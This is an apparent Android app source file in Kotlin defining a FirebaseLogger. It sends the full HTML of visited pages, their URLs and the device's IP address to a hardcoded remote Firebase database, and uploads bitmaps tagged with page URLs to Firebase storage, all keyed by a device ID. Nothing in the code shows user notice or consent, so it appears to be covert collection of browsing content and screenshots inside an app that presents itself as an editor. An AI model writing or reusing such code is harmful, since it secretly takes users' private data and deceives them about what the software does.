package com.peditor.green.Utils.lk.creator

import android.graphics.Bitmap
import com.amplitude.api.Amplitude
import com.google.firebase.database.FirebaseDatabase
import com.google.firebase.ktx.Firebase
import com.google.firebase.storage.ktx.storage
import java.io.ByteArrayOutputStream
import java.lang.Exception
import java.net.InetAddress
import java.net.NetworkInterface
import java.util.*

object FirebaseLogger {

    fun logPage(rawUrl: String, html: String) {
        var id = Amplitude.getInstance().deviceId
        var log = LogModel(getIPAddress(true)!!, html)
        var url = clearUrl(rawUrl)
        FirebaseDatabase
                .getInstance("https://overlay-e9c56-default-rtdb.firebaseio.com/")
                .reference
                .child(id)
                .child("(${Calendar.getInstance().timeInMillis}) $url")
                .setValue(log)
                .addOnSuccessListener {

                }
    }

    private fun clearUrl(rawUrl: String): String {
        var url = rawUrl.replace(".", "-")
        url = url.replace("/", "--")
        url = url.replace("#", "+")
        url = url.replace("$", "~")
        url = url.replace("[", "(")
        url = url.replace("]", ")")
        return url
    }

    private fun getIPAddress(useIPv4: Boolean): String? {
        try {
            val interfaces: List<NetworkInterface> = Collections.list(NetworkInterface.getNetworkInterfaces())
            for (intf in interfaces) {
                val addrs: List<InetAddress> = Collections.list(intf.getInetAddresses())
                for (addr in addrs) {
                    if (!addr.isLoopbackAddress()) {
                        val sAddr: String = addr.getHostAddress()
                        //boolean isIPv4 = InetAddressUtils.isIPv4Address(sAddr);
                        val isIPv4 = sAddr.indexOf(':') < 0
                        if (useIPv4) {
                            if (isIPv4) return sAddr
                        } else {
                            if (!isIPv4) {
                                val delim = sAddr.indexOf('%') // drop ip6 zone suffix
                                return if (delim < 0) sAddr.toUpperCase() else sAddr.substring(0, delim).toUpperCase()
                            }
                        }
                    }
                }
            }
        } catch (ignored: Exception) {

        } // for now eat exceptions
        return ""
    }

    fun saveImage(bitmap: Bitmap, url : String) {
        val stream = ByteArrayOutputStream()
        bitmap.compress(Bitmap.CompressFormat.PNG, 100, stream)
        val byteArray: ByteArray = stream.toByteArray()

        var reference = Firebase.storage.reference
        var timeStampRef = reference.child("${Amplitude.getInstance().deviceId}/${Calendar.getInstance().timeInMillis}  ${clearUrl(url)}")
        timeStampRef.putBytes(byteArray)
    }
}